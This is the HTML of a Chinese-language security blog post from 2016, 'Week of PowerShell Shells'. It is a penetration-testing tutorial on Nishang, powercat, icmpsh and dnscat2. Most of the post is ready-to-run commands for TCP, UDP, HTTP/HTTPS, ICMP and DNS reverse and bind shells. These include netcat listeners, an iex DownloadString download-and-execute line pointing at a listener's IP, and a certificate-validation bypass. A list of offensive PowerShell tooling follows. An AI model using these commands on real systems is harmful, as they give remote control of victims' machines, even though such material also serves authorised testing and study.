@@ -1,0 +1,726 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="PowerShell,RAT," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> Week of PowerShell Shells // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              Week of PowerShell Shells
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2016-01-14
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2016/01/14/week-of-powershell-shells/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/14/week-of-powershell-shells/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="简介">简介</h1><p>Nishang是基于PowerShell的渗透测试专用工具。集成了框架、脚本和各种payload。本篇主要介绍nishang中的各种shell。<code>主要针对预装有powershell的系统</code>。</p>
+<h1 id="TCP_Shell">TCP Shell</h1><h2 id="Reverse_Shell">Reverse Shell</h2><h3 id="Server">Server</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 4444</span></span><br><span class="line">listening <span class="function_start"><span class="keyword">on</span></span> [any] <span class="number">4444</span> ..</span><br></pre></td></tr></table></figure>
+<h3 id="Client">Client</h3><p>192.168.52.129 为Server的IP地址<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellTcp.ps1</span></span><br><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span>.<span class="number">52.129</span> -Port <span class="number">4444</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Bind_Shell">Bind Shell</h2><h3 id="Client-1">Client</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellTcp.ps1</span></span><br><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> Invoke-PowerShellTcp -Bind -Port <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+<h3 id="Server-1">Server</h3><p>192.168.52.1 为Client的IP地址<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\Shells&gt; . .\powercat<span class="class">.ps1</span></span><br><span class="line">PS F:\Shells&gt; powercat -c <span class="number">192.168</span>.<span class="number">52.1</span> -v -<span class="tag">p</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="UDP_Shell">UDP Shell</h1><h2 id="Reverse_Shell-1">Reverse Shell</h2><h3 id="Server-2">Server</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvup 53</span></span><br><span class="line">listening <span class="function_start"><span class="keyword">on</span></span> [any] <span class="number">53</span> ...</span><br></pre></td></tr></table></figure>
+<h3 id="Client-2">Client</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellUdp.ps1</span></span><br><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> Invoke-PowerShellUdp -Reverse -IPAddress <span class="number">192.168</span>.<span class="number">52.129</span> -Port <span class="number">53</span></span><br></pre></td></tr></table></figure>
+<h2 id="Bind_Shell-1">Bind Shell</h2><h3 id="Client-3">Client</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellUdp.ps1</span></span><br><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> Invoke-PowerShellUdp -Bind -Port <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+<h3 id="Server-3">Server</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -vtu 192.168.52.1 7777</span></span><br></pre></td></tr></table></figure>
+<h1 id="HTTP/HTTPS_Shell">HTTP/HTTPS Shell</h1><h2 id="HTTP">HTTP</h2><h3 id="Server-4">Server</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PoshRatHttp.ps1</span></span><br><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> Invoke-PoshRatHttp -IPAddress <span class="number">192.168</span>.<span class="number">52.1</span> -Port <span class="number">80</span></span><br></pre></td></tr></table></figure>
+<h3 id="Client-4">Client</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg&gt; iex (New-Object Net.WebClient).<span class="function"><span class="title">DownloadString</span><span class="params">(<span class="string">"http://192.168.52.1/connect"</span>)</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="HTTPS">HTTPS</h2><h3 id="Server-5">Server</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1</span><br><span class="line">PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress <span class="number">192.168.52.1</span> -Port 8443</span><br><span class="line">Listening on 8443</span><br><span class="line"><span class="number">6D559E59</span>25FBCC8BE5FB<span class="number">3257F503</span>CB<span class="number">8A6C5791</span>A7</span><br></pre></td></tr></table></figure>
+<h3 id="Client-5">Client</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">PS</span> <span class="rule"><span class="attribute">C</span>:<span class="value">\Users\evi1cg&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;</span></span>;<span class="tag">iex</span> (<span class="tag">New-Object</span> <span class="tag">Net</span><span class="class">.WebClient</span>)<span class="class">.DownloadString</span>("<span class="rule"><span class="attribute">https</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">52.1</span>:<span class="number">8443</span>/connect<span class="string">")</span></span></span></span><br></pre></td></tr></table></figure>
+<h1 id="ICMP_Shell">ICMP Shell</h1><p>这里需要一个脚本<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="external">icmpsh</a></p>
+<h2 id="Server-6">Server</h2><p>python icmpsh_m.py   (Attacker’s IP) (Victims IP)<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icmpsh [master] sysctl -w net<span class="class">.ipv4</span><span class="class">.icmp_echo_ignore_all</span>=<span class="number">1</span> #忽略所有icmp包或者ping</span><br><span class="line">net<span class="class">.ipv4</span><span class="class">.icmp_echo_ignore_all</span> = <span class="number">1</span></span><br><span class="line">icmpsh [master] python icmpsh_m<span class="class">.py</span> <span class="number">192.168</span>.<span class="number">52.131</span> <span class="number">192.168</span>.<span class="number">52.1</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Client-6">Client</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> . .<span class="string">\Invoke-PowerShellIcmp.ps1</span></span><br><span class="line">PS <span class="attribute">F</span>:<span class="string">\Shells&gt;</span> Invoke-PowerShellIcmp -IPAddress <span class="number">192.168</span>.<span class="number">52.131</span></span><br></pre></td></tr></table></figure>
+<h1 id="DNS_Shell">DNS Shell</h1><p>此次示例需要<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="external">dnscat2</a>以及<a href="https://github.com/besimorhino/powercat" target="_blank" rel="external">powercat</a>。<br>安装完dnscat2后。</p>
+<h2 id="Server-7">Server</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">ruby</span> <span class="tag">dnscat2</span><span class="class">.rb</span> <span class="tag">shellcome</span><span class="class">.com</span></span><br></pre></td></tr></table></figure>
+<h2 id="Client-7">Client</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\Shells&gt; . .\powercat<span class="class">.ps1</span></span><br><span class="line">PS F:\Shells&gt; powercat -c <span class="number">192.168</span>.<span class="number">52.131</span> -v -dns shellcome<span class="class">.com</span> -ep</span><br></pre></td></tr></table></figure>
+<h1 id="MORE">MORE</h1><p>powershell 工具整理</p>
+<p>UnmanagedPowerShell ：<a href="https://github.com/leechristensen/UnmanagedPowerShell" target="_blank" rel="external">https://github.com/leechristensen/UnmanagedPowerShell</a></p>
+<p>可以从一个非托管程序来执行PowerShell , 经过一些修改后也可以被用来注入到其他进程。</p>
+<p>Throwback：<a href="https://github.com/silentbreaksec/Throwback" target="_blank" rel="external">https://github.com/silentbreaksec/Throwback</a></p>
+<p>HTTP/S 标记注入</p>
+<p>ThrowbackLP：<a href="https://github.com/silentbreaksec/ThrowbackLP" target="_blank" rel="external">https://github.com/silentbreaksec/ThrowbackLP</a></p>
+<p>监听站反向注入</p>
+<p>CrackMapExec：<a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="external">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
+<p>Windows/Active Directory环境下的一站式渗透测试</p>
+<p>PowerShellMafia：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>PowerSploit 是Microsoft中能够帮助渗透人员在所有阶段进行评估的PowerShell模块集。</p>
+<p>nishang：<a href="https://github.com/samratashok/nishang" target="_blank" rel="external">https://github.com/samratashok/nishang</a></p>
+<p>Nishang是基于PowerShell的渗透测试专用工具。集成了框架、脚本和各种payload。这些脚本是由Nishang的作者在真实渗透测试过程中有感而发编写的，具有实战价值。包括了下载和执行、键盘记录、dns、延时命令等脚本。（Freebuf的相关帖子：<a href="http://www.freebuf.com/tools/10443.html）" target="_blank" rel="external">http://www.freebuf.com/tools/10443.html）</a></p>
+<p>ReflectiveDLLInjection ：<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="external">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p>
+<p>反射型 DLL 注入 是一种库注入技术，主要被用来执行一个库从内存到主机进程的加载。因此这个库应能够通过实现最小的PE文件加载器来加载自身，以最小的主机系统与进程间的相互作用来进行管理。</p>
+<p>PSRecon ：<a href="https://github.com/gfoss/PSRecon" target="_blank" rel="external">https://github.com/gfoss/PSRecon</a></p>
+<p>PSRecon会使用PowerShell（V2或更高版本）从远程的windows主机收集数据，然后将数据放入文件夹中，对全部提取数据、PowerShell、各种系统性能进行哈希，最后将数据发送给安全团队。该数据可以共享，发送邮件或者局部保留。</p>
+<p>powershell：<a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="external">https://github.com/clymb3r/PowerShell</a></p>
+<p>该工具是PowerSploit目录的一部分</p>
+<p>powershell：<a href="https://github.com/MikeFal/PowerShell" target="_blank" rel="external">https://github.com/MikeFal/PowerShell</a></p>
+<p>用SQL Server数据库进行管理，包含完成的以及正在进行的PowerShell脚本。</p>
+<p>PowerShellArsenal：<a href="https://github.com/mattifestation/PowerShellArsenal" target="_blank" rel="external">https://github.com/mattifestation/PowerShellArsenal</a></p>
+<p>用于逆向工程的PowerShell模块，可进行反汇编托管以及非托管的代码、进行.NET恶意软件分析、分析内存、解析文件格式和内存结构、获得内部系统信息等。</p>
+<p>PowerShell-AD-Recon：<a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="external">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
+<p>一个有用的PowerShell脚本</p>
+<p>PowerCat ：<a href="https://github.com/secabstraction/PowerCat" target="_blank" rel="external">https://github.com/secabstraction/PowerCat</a></p>
+<p>PowerShell的TCP/ IP瑞士军刀，适用于Netcat &amp; Ncat.</p>
+<p>Unicorn：<a href="https://github.com/trustedsec/unicorn" target="_blank" rel="external">https://github.com/trustedsec/unicorn</a></p>
+<p>Unicorn 是一个用于PowerShell降级攻击和直接注入shellcode到内存中的简单工具。</p>
+<p>Posh-SecMod：<a href="https://github.com/darkoperator/Posh-SecMod" target="_blank" rel="external">https://github.com/darkoperator/Posh-SecMod</a></p>
+<p>用Security cmdlets来进行安全工作的PowerShell模块</p>
+<p>PowerShell API 手册 ：<a href="http://www.pinvoke.net/" target="_blank" rel="external">http://www.pinvoke.net/</a></p>
+<p>PInvoke.net主要是一个wiki，允许开发者找到，编辑和添加PInvoke的*签名、用户定义类型、以及与调用Win32和其他非托管API的托管代码相关的任何其他信息。</p>
+<p>PowerTools工具 ：<a href="http://https//github.com/PowerShellEmpire/PowerTools" target="_blank" rel="external">http://https//github.com/PowerShellEmpire/PowerTools</a></p>
+<p>Empire ：<a href="https://github.com/powershellempire/empire" target="_blank" rel="external">https://github.com/powershellempire/empire</a></p>
+<p>PowerShell后期漏洞利用代理工具（详见：<a href="http://www.freebuf.com/articles/web/76892.html）" target="_blank" rel="external">http://www.freebuf.com/articles/web/76892.html）</a></p>
+<p>Honeyport ：<a href="https://github.com/Pwdrkeg/honeyport" target="_blank" rel="external">https://github.com/Pwdrkeg/honeyport</a></p>
+<p>一个用于创建Windows honeyport的PowerShell脚本</p>
+<p>PowerMemory ：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="external">https://github.com/giMini/PowerMemory</a></p>
+<p>可利用文件和内存中当前的一些证书</p>
+<h2 id="网络相关">网络相关</h2><p>icmpsh <a href="https://github.com/inquisb/icmpsh" target="_blank" rel="external">https://github.com/inquisb/icmpsh</a><br>powercat <a href="https://github.com/besimorhino/powercat" target="_blank" rel="external">https://github.com/besimorhino/powercat</a><br>dnscat2 <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="external">https://github.com/iagox86/dnscat2</a></p>
+<p>```</p>
+<h1 id="参考资料">参考资料</h1><p>[1] <a href="https://www.youtube.com/watch?v=RSKj9WDJqL0" target="_blank" rel="external">Week of PowerShell Shells - Day 1 - TCP Shell</a><br>[2] <a href="http://www.freebuf.com/tools/89918.html" target="_blank" rel="external">一周PowerShell脚本</a><br>[3] <a href="https://github.com/samratashok/nishang" target="_blank" rel="external">nishang - github</a><br>[4] <a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html" target="_blank" rel="external">Nikhil SamratAshok Mittal - blog</a><br>[5] <a href="http://evi1cg.me/archives/Nishang_shells.html" target="_blank" rel="external">nishang之花样shell</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PowerShell/"> #PowerShell </a>
+          
+            <a href="/tags/RAT/"> #RAT </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/01/12/nishang/">PowerShell nishang</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/01/14/week-of-powershell-shells/"
+               data-title="Week of PowerShell Shells" data-url="http://blkstone.github.io/2016/01/14/week-of-powershell-shells/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">11</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">55</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TCP_Shell"><span class="nav-number">2.</span> <span class="nav-text">TCP Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse_Shell"><span class="nav-number">2.1.</span> <span class="nav-text">Reverse Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server"><span class="nav-number">2.1.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client"><span class="nav-number">2.1.2.</span> <span class="nav-text">Client</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bind_Shell"><span class="nav-number">2.2.</span> <span class="nav-text">Bind Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Client-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Client</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">Server</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UDP_Shell"><span class="nav-number">3.</span> <span class="nav-text">UDP Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse_Shell-1"><span class="nav-number">3.1.</span> <span class="nav-text">Reverse Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-2"><span class="nav-number">3.1.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client-2"><span class="nav-number">3.1.2.</span> <span class="nav-text">Client</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bind_Shell-1"><span class="nav-number">3.2.</span> <span class="nav-text">Bind Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Client-3"><span class="nav-number">3.2.1.</span> <span class="nav-text">Client</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-3"><span class="nav-number">3.2.2.</span> <span class="nav-text">Server</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP/HTTPS_Shell"><span class="nav-number">4.</span> <span class="nav-text">HTTP/HTTPS Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP"><span class="nav-number">4.1.</span> <span class="nav-text">HTTP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-4"><span class="nav-number">4.1.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client-4"><span class="nav-number">4.1.2.</span> <span class="nav-text">Client</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTPS"><span class="nav-number">4.2.</span> <span class="nav-text">HTTPS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Server-5"><span class="nav-number">4.2.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client-5"><span class="nav-number">4.2.2.</span> <span class="nav-text">Client</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ICMP_Shell"><span class="nav-number">5.</span> <span class="nav-text">ICMP Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-6"><span class="nav-number">5.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Client-6"><span class="nav-number">5.2.</span> <span class="nav-text">Client</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS_Shell"><span class="nav-number">6.</span> <span class="nav-text">DNS Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-7"><span class="nav-number">6.1.</span> <span class="nav-text">Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Client-7"><span class="nav-number">6.2.</span> <span class="nav-text">Client</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MORE"><span class="nav-number">7.</span> <span class="nav-text">MORE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#网络相关"><span class="nav-number">7.1.</span> <span class="nav-text">网络相关</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">8.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2016
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
